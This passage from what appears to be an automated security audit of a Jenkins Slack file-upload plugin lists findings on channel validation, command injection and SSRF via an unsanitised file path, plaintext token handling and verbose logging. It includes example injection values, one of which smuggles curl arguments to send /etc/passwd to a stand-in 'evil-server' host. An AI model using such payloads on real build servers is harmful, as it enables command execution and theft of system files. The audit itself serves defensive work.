However, it does not properly validate that each channel name starts with `#` and contains only valid characters.\n\n      This could allow an attacker to provide a malformed `channel` value that bypasses validation and specifies an unauthorized Slack channel to post files to. For example, passing `badchannel,#goodchannel` would post to both the unauthorized \"badchannel\" and the allowed \"#goodchannel\".\n\n      To exploit this, an attacker would need access to configure the SlackUploader build step with a malicious `channel` value. This might be possible if they have Job/Configure permissions in Jenkins, or if they can modify job configurations externally and have them imported into Jenkins.\n    cwe: CWE-20\n    function_names:\n      - doCheckChannel\n    filenames:\n      - src/main/java/SlackUploader.java\n    classification: very promising\n\n  - headline: SSRF and command injection through script interpolation of improperly validated file path\n    analysis: |\n      The `filePath` parameter is directly interpolated into a shell script without proper validation or sanitization. The `doCheckFilePath` method only checks for empty values but does not validate or sanitize the contents.\n\n      This introduces vulnerabilities like server-side request forgery (SSRF) and command injection. An attacker could provide a malicious `filePath` value containing shell metacharacters to break out of the `ls` command and execute arbitrary commands. \n\n      For example, passing a `filePath` of `/example/path; malicious-command-here` would execute `malicious-command-here` after listing files in `/example/path`. This could be used to steal sensitive data, modify files, or gain remote code execution on the Jenkins server or connected systems.\n\n      The SSRF risk arises because the unvalidated `filePath` is passed as an argument to `curl`, allowing an attacker to make the Jenkins server issue arbitrary HTTP requests. For example, passing `filePath` of `ignored-path -F file=@/etc/passwd http://evil-server/upload` would exfiltrate the `/etc/passwd` file to the attacker's server.\n    cwe: CWE-918\n    function_names:\n      - generateScript\n      - doCheckFilePath \n    filenames:\n      - src/main/java/SlackUploader.java\n    classification: very promising\n    \n  - headline: Cleartext transmission and storage of sensitive Slack token\n    analysis: |\n      The Slack token, which is a sensitive credential providing access to the Slack API, is stored in the job configuration and passed to the shell script as plaintext. This sensitive token is visible to any user or process that can access the job configuration or build logs.\n      \n      Best practices for handling secrets like tokens recommend:\n      1. Not storing them in plaintext job configurations \n      2. Not passing them as arguments to shell scripts where they may be logged\n      3. Encrypting them in transit and at rest\n      4. Rotating them periodically\n      5. Restricting access to them as much as possible\n\n      The current implementation violates these best practices. An attacker could exploit this to gain unauthorized access to the Slack API if they can view the job configuration, build logs, or environment of a running build. This could lead to data exfiltration, phishing attempts, and other damage depending on the permissions of the token.\n    cwe: CWE-522  \n    function_names:\n      - generateScript\n    filenames:\n      - src/main/java/SlackUploader.java\n    classification: very promising\n\n  - headline: Verbose error messages in file upload may disclose sensitive information\n    analysis: |\n      The `logOutput` method captures both standard output and standard error from the file upload script and logs it to both the Jenkins build console log and JVM log. This verbose logging of errors may include sensitive information like local file paths, configuration settings, tokens, etc.\n\n      If an attacker can trigger error conditions in the file upload script, they can potentially harvest sensitive information from the verbose error messages logged. This information disclosure could help the attacker refine other attacks.\n\n      Best practices recommend sanitizing error messages of any sensitive information before logging or displaying them.
